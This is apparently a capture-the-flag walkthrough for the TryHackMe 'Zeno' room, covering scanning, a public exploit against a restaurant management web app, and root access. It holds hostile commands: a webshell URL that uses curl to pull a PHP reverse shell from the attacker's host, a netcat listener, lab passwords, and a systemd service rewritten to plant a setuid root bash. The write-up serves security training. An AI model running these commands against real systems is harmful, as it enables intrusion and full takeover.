# Zeno

R**oom Link:** [https://tryhackme.com/room/zeno](https://tryhackme.com/room/zeno)



## **Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/12340- HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:12340 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Restaurant Management System Exploit

**Exploit:** [https://www.exploit-db.com/raw/47520](https://www.exploit-db.com/raw/47520)

The code needed some fixing up

**From**

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**To**

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python exploit.py http://$VICTIM:12340/rms/
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php 
```



**Kali**

```
python2 -m SimpleHTTPServer 81
```

**Browser**

```
http://$VICTIM:12340/rms/images/reverse-shell.php?cmd=curl%20-O%20http://10.10.57.58:81/php-reverse-shell.php
```



**Kali**

```
nc -lvnp 1337
```

**Browser**

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



### LinPeas

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
curl -O http://$KALI:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## MySQL

**Victim**

```
mysql -u root -pveerUffIrangUfcubyig
```

**Victim(mysql)**

```
show databases;
use dbrms;
show tables;
select * from members;
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Edwards password was still not found

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I went back to linpeas and found another password, it's for a different user but it still worked.

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## TCP/22- SSH

**Kali**

```
ssh edward@$VICTIM
Password: FrobjoodAdkoonceanJa
```



**Victim(edward)**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Victim(apache)**

```
find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
```

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

**Victim(apache)**

```
vi /etc/systemd/system/zeno-monitoring.service
```

**From**

<figure><img src="../../.gitbook/assets/image (808).png" alt=""><figcaption></figcaption></figure>

**To**

```
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash_root; chmod +xs /home/edward/bash_root'

[Install]
WantedBy=multi-user.target
```

<figure><img src="../../.gitbook/assets/image (810).png" alt=""><figcaption></figcaption></figure>

**Victim(edward)**

```
sudo /usr/sbin/reboot
```

**Kali**

```
ssh edward@$VICTIM
Password: FrobjoodAdkoonceanJa
```

**Victim(edward)**

```
ls -lah
./bash_root -p
```

<figure><img src="../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>
